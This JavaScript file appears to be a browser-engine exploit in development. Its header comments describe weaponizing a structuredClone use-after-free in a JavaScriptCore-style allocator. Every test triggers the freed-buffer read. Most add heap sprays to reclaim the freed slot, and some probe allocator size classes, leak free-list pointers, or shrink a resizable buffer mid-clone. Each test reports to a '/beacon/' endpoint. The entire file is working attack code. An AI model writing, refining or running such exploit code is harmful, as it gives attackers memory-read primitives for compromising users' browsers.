/* p86-weapon — Weaponize structuredClone TOCTOU UAF (R2 confirmed)
 *
 * R2 proved: structuredClone snapshots buf, later getter detaches it,
 * clone copies from FREED memory. byte0=0xEE confirmed.
 *
 * NOW: Can we make bmalloc reuse the freed slot DURING the getter?
 * If yes → clone reads our controlled replacement data = arbitrary read.
 *
 * Strategy:
 * 1. Allocate 4096-byte ArrayBuffer, fill with 0xEE (victim)
 * 2. structuredClone({buf: victim, zzz: getter})
 * 3. In getter: detach victim, spray 4096-byte buffers with marker 0x41
 * 4. If clone reads 0x41 → bmalloc reused the slot → confused deputy!
 *
 * Beacon prefix: V86W-
 */
(function(){
"use strict";
var RUN_ID = "v86w" + Math.random().toString(36).slice(2,12);
var PREFIX = "V86W-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press86-weapon");

/* ====== W1: Basic spray — single size class ====== */
function test_W1() {
  var r = {};
  try {
    var BUFSIZE = 4096;
    var victim = new ArrayBuffer(BUFSIZE);
    var vView = new Uint8Array(victim);
    for (var i = 0; i < BUFSIZE; i++) vView[i] = 0xEE;

    var sprayBufs = [];
    var obj = {};
    obj.buf = victim;

    Object.defineProperty(obj, 'zzz_spray', {
      enumerable: true,
      get: function() {
        // Detach victim
        try { structuredClone(victim, { transfer: [victim] }); } catch(e) {}

        // Spray: allocate many 4096-byte buffers with marker
        for (var s = 0; s < 200; s++) {
          var spray = new ArrayBuffer(BUFSIZE);
          var sv = new Uint8Array(spray);
          for (var j = 0; j < BUFSIZE; j++) sv[j] = 0x41; // 'A' marker
          sprayBufs.push(spray);
        }
        return "sprayed";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(cloned.buf);
        r.clonedLen = cloned.buf.byteLength;
        r.byte0 = cv[0];
        r.byte100 = cv[100];
        r.byte2000 = cv[2000];

        // Count marker bytes vs original bytes
        var markerCount = 0, origCount = 0, zeroCount = 0, otherCount = 0;
        for (var k = 0; k < cv.length; k++) {
          if (cv[k] === 0x41) markerCount++;
          else if (cv[k] === 0xEE) origCount++;
          else if (cv[k] === 0) zeroCount++;
          else otherCount++;
        }
        r.markerCount = markerCount;
        r.origCount = origCount;
        r.zeroCount = zeroCount;
        r.otherCount = otherCount;
        r.REUSE = markerCount > 0;
        r.FULL_REUSE = markerCount === BUFSIZE;
        r.PARTIAL_REUSE = markerCount > 0 && markerCount < BUFSIZE;

        // Sample first 32 bytes as hex
        var hex = [];
        for (var h = 0; h < 32; h++) hex.push(cv[h].toString(16).padStart(2,'0'));
        r.first32 = hex.join('');
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }

    sprayBufs = null;
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W1-SPRAY-BASIC", r);
}

/* ====== W2: Spray with different sizes to find bmalloc size class ====== */
function test_W2() {
  var r = {};
  try {
    // Try multiple victim sizes to find which bmalloc size class gets reused fastest
    var sizes = [256, 512, 1024, 2048, 4096, 8192];
    var results = [];

    for (var si = 0; si < sizes.length; si++) {
      var sz = sizes[si];
      var victim = new ArrayBuffer(sz);
      new Uint8Array(victim).fill(0xBB);

      var sprayBufs = [];
      var obj = {};
      obj.buf = victim;

      (function(sprayRef, victimRef, size) {
        Object.defineProperty(obj, 'zzz_spray', {
          enumerable: true,
          get: function() {
            try { structuredClone(victimRef, { transfer: [victimRef] }); } catch(e) {}
            for (var s = 0; s < 100; s++) {
              var spray = new ArrayBuffer(size);
              new Uint8Array(spray).fill(0x42);
              sprayRef.push(spray);
            }
            return 1;
          }, configurable: true
        });
      })(sprayBufs, victim, sz);

      try {
        var cloned = structuredClone(obj);
        if (cloned.buf instanceof ArrayBuffer) {
          var cv = new Uint8Array(cloned.buf);
          var marker = 0;
          for (var k = 0; k < cv.length; k++) {
            if (cv[k] === 0x42) marker++;
          }
          results.push(sz + ":" + marker + "/" + cv.length);
        }
      } catch(e) {
        results.push(sz + ":ERR");
      }
      sprayBufs = null;
    }

    r.results = results.join("|");
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W2-SIZE-CLASS", r);
}

/* ====== W3: Spray with structured data (simulated pointers) ====== */
function test_W3() {
  var r = {};
  try {
    var BUFSIZE = 4096;
    var victim = new ArrayBuffer(BUFSIZE);
    new Uint8Array(victim).fill(0xEE);

    var sprayBufs = [];
    var obj = {};
    obj.buf = victim;

    Object.defineProperty(obj, 'zzz_spray', {
      enumerable: true,
      get: function() {
        try { structuredClone(victim, { transfer: [victim] }); } catch(e) {}

        // Spray with structured data: fake tagged JSC values
        // JSC tagged pointer: top 16 bits = tag, bottom 48 = pointer
        // NaN-boxing: doubles stored as-is, pointers have tag bits set
        for (var s = 0; s < 200; s++) {
          var spray = new ArrayBuffer(BUFSIZE);
          var f64 = new Float64Array(spray);
          for (var j = 0; j < f64.length; j++) {
            // Write a pattern we can recognize: ascending 64-bit values
            // Use DataView for precise control
            var dv = new DataView(spray);
            dv.setFloat64(j * 8, j * 1000 + 0.5, true); // little-endian
          }
          sprayBufs.push(spray);
        }
        return 1;
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var f64c = new Float64Array(cloned.buf);
        r.clonedLen = cloned.buf.byteLength;
        r.f64_0 = f64c[0];
        r.f64_1 = f64c[1];
        r.f64_10 = f64c[10];

        // Check if we see our structured spray pattern
        var patternMatch = 0;
        for (var k = 0; k < f64c.length; k++) {
          if (Math.abs(f64c[k] - (k * 1000 + 0.5)) < 0.01) patternMatch++;
        }
        r.patternMatch = patternMatch;
        r.totalF64 = f64c.length;
        r.CONTROLLED_READ = patternMatch > f64c.length / 2;

        // Also dump raw hex of first 64 bytes
        var hex = [];
        var u8c = new Uint8Array(cloned.buf);
        for (var h = 0; h < 64; h++) hex.push(u8c[h].toString(16).padStart(2,'0'));
        r.first64hex = hex.join('');
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }

    sprayBufs = null;
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W3-STRUCT-SPRAY", r);
}

/* ====== W4: Double clone — clone once (gets freed data), mutate, clone again ====== */
function test_W4() {
  var r = {};
  try {
    var BUFSIZE = 4096;
    var victim = new ArrayBuffer(BUFSIZE);
    new Uint8Array(victim).fill(0xDD);

    var round = 0;
    var clones = [];

    function doClone() {
      var localVictim = round === 0 ? victim : new ArrayBuffer(BUFSIZE);
      if (round > 0) new Uint8Array(localVictim).fill(0xDD);

      var obj = {};
      obj.buf = localVictim;

      Object.defineProperty(obj, 'zzz_mut', {
        enumerable: true,
        get: function() {
          try { structuredClone(localVictim, { transfer: [localVictim] }); } catch(e) {}
          // Spray with round-specific marker
          for (var s = 0; s < 50; s++) {
            var spray = new ArrayBuffer(BUFSIZE);
            new Uint8Array(spray).fill(0x50 + round); // 0x50, 0x51, 0x52...
          }
          return round;
        }, configurable: true
      });

      try {
        var c = structuredClone(obj);
        clones.push(c);
      } catch(e) {}
      round++;
    }

    // Do 4 rounds
    doClone(); doClone(); doClone(); doClone();

    // Compare clones
    r.cloneCount = clones.length;
    for (var ci = 0; ci < clones.length; ci++) {
      if (clones[ci].buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(clones[ci].buf);
        var counts = {};
        for (var k = 0; k < cv.length; k++) {
          var v = cv[k];
          counts[v] = (counts[v] || 0) + 1;
        }
        // Find dominant byte value
        var maxV = -1, maxC = 0;
        for (var key in counts) {
          if (counts[key] > maxC) { maxC = counts[key]; maxV = parseInt(key); }
        }
        r["c" + ci + "_dominant"] = maxV.toString(16) + "x" + maxC;
      }
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W4-MULTI-CLONE", r);
}

/* ====== W5: RAB TOCTOU — large buffer crossing page boundary ====== */
function test_W5() {
  var r = {};
  try {
    // R1 used 4096 bytes (within one 16KB page, no mprotect effect)
    // Now try 256KB — shrink to 64 bytes — mprotect removes 15+ pages
    // If serializer reads past mprotected pages → CRASH (detected) or bypass
    var BIGSIZE = 256 * 1024; // 256KB
    var rab = new ArrayBuffer(BIGSIZE, { maxByteLength: BIGSIZE });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < BIGSIZE; i++) u8[i] = 0xAA;

    var obj = {};
    obj.buf = rab;

    Object.defineProperty(obj, 'zzz_shrink', {
      enumerable: true,
      get: function() {
        rab.resize(64); // shrink from 256KB to 64 bytes
        return "shrunk";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte63 = cv[63];
        // Check past first page (16KB)
        if (cv.length > 16384) {
          r.byte16384 = cv[16384];
          r.CROSS_PAGE = true;
        }
        if (cv.length > 65536) {
          r.byte65536 = cv[65536];
        }
        r.SIZE_MISMATCH = cloned.buf.byteLength > 64;
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,80);
      // If crash/error → mprotect is enforced, serializer hit protected page
      r.MPROTECT_HIT = e.name === "TypeError" || e.name === "RangeError";
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W5-BIG-RAB", r);
}

/* ====== W6: Read leaked metadata — look for bmalloc free list pointers ====== */
function test_W6() {
  var r = {};
  try {
    var BUFSIZE = 4096;
    var victim = new ArrayBuffer(BUFSIZE);
    new Uint8Array(victim).fill(0xEE);

    var obj = {};
    obj.buf = victim;

    Object.defineProperty(obj, 'zzz_free', {
      enumerable: true,
      get: function() {
        // Detach but DON'T spray — leave freed memory as-is
        // bmalloc may write free list pointers into the freed block
        try { structuredClone(victim, { transfer: [victim] }); } catch(e) {}
        return 1;
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var dv = new DataView(cloned.buf);
        // Read first 16 uint64 values — look for pointers
        var vals = [];
        for (var i = 0; i < 16; i++) {
          // Read as two uint32 (no BigInt needed)
          var lo = dv.getUint32(i * 8, true);
          var hi = dv.getUint32(i * 8 + 4, true);
          vals.push(hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
        }
        r.first16_u64 = vals.join("|");

        // Check if any look like pointers (non-zero high bits, aligned)
        var pointerLike = 0;
        for (var j = 0; j < vals.length; j++) {
          var hi2 = parseInt(vals[j].slice(0,8), 16);
          var lo2 = parseInt(vals[j].slice(8,16), 16);
          if (hi2 > 0 && hi2 < 0x0001000000000000 && (lo2 & 0x7) === 0) {
            pointerLike++;
          }
        }
        r.pointerLike = pointerLike;

        // Check if all bytes are still 0xEE (bmalloc didn't touch freed block)
        var u8 = new Uint8Array(cloned.buf);
        var eeCount = 0;
        for (var k = 0; k < u8.length; k++) {
          if (u8[k] === 0xEE) eeCount++;
        }
        r.eeCount = eeCount;
        r.UNTOUCHED = eeCount === BUFSIZE;
        r.METADATA_WRITTEN = eeCount < BUFSIZE;
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }

  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("W6-FREELIST", r);
}

/* ====== Run ====== */
try {
  test_W1();
  setTimeout(test_W2, 500);
  setTimeout(test_W3, 1200);
  setTimeout(test_W4, 2000);
  setTimeout(test_W5, 3000);
  setTimeout(test_W6, 3500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe86-done"); }, 22000);
})();
